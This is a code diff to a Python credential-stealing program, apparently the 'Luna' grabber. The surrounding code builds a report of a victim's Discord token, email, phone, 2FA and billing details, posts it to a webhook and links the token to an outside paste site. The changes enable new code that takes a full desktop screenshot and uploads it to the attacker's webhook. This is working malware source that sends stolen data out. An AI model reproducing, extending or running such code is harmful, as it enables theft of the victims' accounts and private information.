@@ -15,7 +15,7 @@ from zipfile import ZIP_DEFLATED, ZipFile
 import psutil
 import requests
 from Crypto.Cipher import AES
-#from PIL import ImageGrab
+from PIL import ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
@@ -460,7 +460,7 @@ class Discord:
                     else:
                         methods += "❓"
 
-            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
+            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔐 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
 
             if "code" in gift.text:
                 codes = json.loads(gift.text)
@@ -487,7 +487,7 @@ class Discord:
                         "color": 5639644,
                         "fields": [
                             {
-                                "name": "\u200b",
+                                "name": "Discord Info",
                                 "value": val
                             }
                         ],
@@ -508,14 +508,34 @@ class Discord:
 
         self.robloxinfo(webhook)
 
-        # image = ImageGrab.grab(
-        #    bbox=None,
-        #    all_screens=True,
-        #    include_layered_windows=False,
-        #    xdisplay=None
-        # )
-        #image.save(temp_path + "\\desktopshot.png")
-        # image.close()
+        image = ImageGrab.grab(
+            bbox=None,
+            all_screens=True,
+            include_layered_windows=False,
+            xdisplay=None
+        )
+        image.save(temp_path + "\\desktopshot.png")
+        image.close()
+
+        webhook_data = {
+            "username": "Luna",
+            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+            "embeds": [
+                {
+                    "color": 5639644,
+                    "title": "Desktop Screenshot",
+                    "image": {
+                        "url": "attachment://image.png"
+                    }
+                }
+            ]
+        }
+
+        with open(temp_path + "\\desktopshot.png", "rb") as f:
+            image_data = f.read()
+            encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})
+
+        requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
 
 
 class Browsers:
